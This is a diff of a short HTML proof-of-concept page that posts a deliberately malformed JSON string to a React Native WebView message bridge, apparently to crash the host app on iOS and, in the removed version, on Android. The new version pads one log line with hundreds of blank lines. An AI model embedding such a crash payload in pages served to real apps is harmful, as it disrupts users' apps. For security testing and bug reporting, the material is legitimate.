@@ -1,38 +1,424 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="utf-8">
-    <title>ReactNativeWebView Cross-Platform Crash PoC</title>
-</head>
 <body>
-    <h2>ReactNativeWebView Cross-Platform Crash PoC</h2>
-    <pre id="log"></pre>
+<pre id="log"></pre>
+<script>
+const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
-    <script>
-        const log = msg => document.getElementById("log").textContent += "\n" + msg;
+try {
+    if (window.webkit?.messageHandlers?.ReactNativeWebView) {
+        log("ReactNativeWebView handler detected.");
 
-        try {
-            // Payload khusus (invalid JSON)
-            const payload = "{unclosed_json:";
+        // Malformed JSON
+        const payload = "{unclosed_json:";
 
-            if (window.ReactNativeWebView && typeof window.ReactNativeWebView.postMessage === "function") {
-                // Android
-                log("ReactNativeWebView detected (Android).");
-                window.ReactNativeWebView.postMessage(payload);
-                log("Payload sent: " + payload);
-            }
-            else if (window.webkit?.messageHandlers?.ReactNativeWebView) {
-                // iOS
-                log("ReactNativeWebView handler detected (iOS).");
-                window.webkit.messageHandlers.ReactNativeWebView.postMessage(payload);
-                log("Payload sent: " + payload);
-            }
-            else {
-                log("ReactNativeWebView not detected.");
-            }
-        } catch (e) {
-            log("JS Exception: " + e.message);
-        }
-    </script>
+        window.webkit.messageHandlers.ReactNativeWebView.postMessage(payload);
+        log("Payload sent: " + 
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            payload);
+    } else {
+        log("ReactNativeWebView handler not available.");
+    }
+} catch (e) {
+    log("JS Exception: " + e.message);
+}
+</script>
 </body>
 </html>
